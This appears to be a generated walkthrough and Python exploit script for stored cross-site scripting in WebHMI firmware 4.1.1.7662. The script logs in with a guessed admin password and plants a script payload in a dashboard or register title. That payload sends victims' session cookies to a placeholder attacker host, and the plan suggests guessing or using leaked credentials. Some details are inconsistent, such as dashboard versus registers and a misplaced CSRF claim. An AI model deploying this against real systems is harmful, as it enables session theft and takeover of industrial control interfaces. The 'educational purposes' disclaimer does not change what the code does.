To generate a realistic exploit script based on the provided information, we'll follow these steps:

1. **Understand the Target and Exploitation Details**:
   - The target is a WebHMI firmware version 4.1.1.7662 that allows for stored XSS via dashboards or registers.
   - We need to add an image tag with an onerror attribute containing our malicious JavaScript payload to steal cookies from the victim's browser.
   - The exploit will be performed by a logged-in admin user on a specific system, which is why we need to know how to authenticate.
2. **Analyzing the Steps**:
   - We need to perform step 1 and step 2 from the steps to reproduce, where we create a new dashboard or register with an XSS payload in the title field.
3. **Generating the Payload**:
   - The payload will be an image tag with an onerror attribute that points to our malicious script (attacker's IP and port).
4. **Authenticating as Admin**:
   - We need to know if there is a way to authenticate as admin, which could involve guessing or using known credentials (if leaked).
5. **Executing the Exploit**:
   - Once we have the payload in place, we will trigger it by visiting the dashboard or register that contains our XSS script.
6. **Capturing the Session ID**:
   - The exploit will cause a GET request to be sent to our server, which includes the session cookie. We need to capture this and use it to log into the admin panel with the stolen credentials.
7. **Analyzing the Impact**:
   - The impact is that any logged-in user will execute our payload when visiting the dashboard or register in question, revealing their session cookies to us.

Now let's create an exploit script that performs these steps. We assume we have access to a WebHMI 4.1 system and know how to authenticate as admin.

```python
import requests

# Configuration: replace with actual values
TARGET_URL = "http://192.168.0.153/"
ATTACKER_IP = "http://ATTACKERIP/"  # Replace with your IP or domain
LOGIN_ENDPOINT = "/admin/login"
DASHBOARD_ADD_ENDPOINT = "/registers/add"
XSS_PAYLOAD = '<script>var i=new Image;i.src="{}?"+document.cookie;</script>'

# Step 1: Authenticate as admin (this part is based on actual login process)
session = requests.Session()
login_data = {
    'username': 'admin',
    'password': 'adminpassword'  # Replace with the correct password if known
}
response = session.post(TARGET_URL + LOGIN_ENDPOINT, data=login_data)
if response.status_code == 200:
    print("Authentication successful.")
else:
    print("Failed to authenticate.")
    exit()

# Step 2: Create a dashboard with XSS payload (simplified example for demonstration)
dashboard_data = {
    'title': XSS_PAYLOAD.format(ATTACKER_IP),
    # ... other required fields in the form
}
response = session.post(TARGET_URL + DASHBOARD_ADD_ENDPOINT, data=dashboard_data)
if response.status_code == 200:
    print("Dashboard created with XSS payload.")
else:
    print("Failed to create dashboard.")
    exit()

# Step 3: Execute the exploit (triggers when user visits the dashboard)
print("Exploit executed. Visit the targeted dashboard or register to trigger the XSS payload.")
```

This script is a basic example and assumes that the server is vulnerable to CSRF by allowing POST requests without validation. In practice, the script would need to handle various authentication challenges (CAPTCHAs, rate limiting) and ensure proper user-agent strings and headers. Additionally, the script does not include error handling or session management, which should be implemented for a real exploit.

Remember that this script is for educational purposes only and should never be used without explicit permission from the owner of the system you are testing. Unauthorized access to computer systems is illegal and unethical.
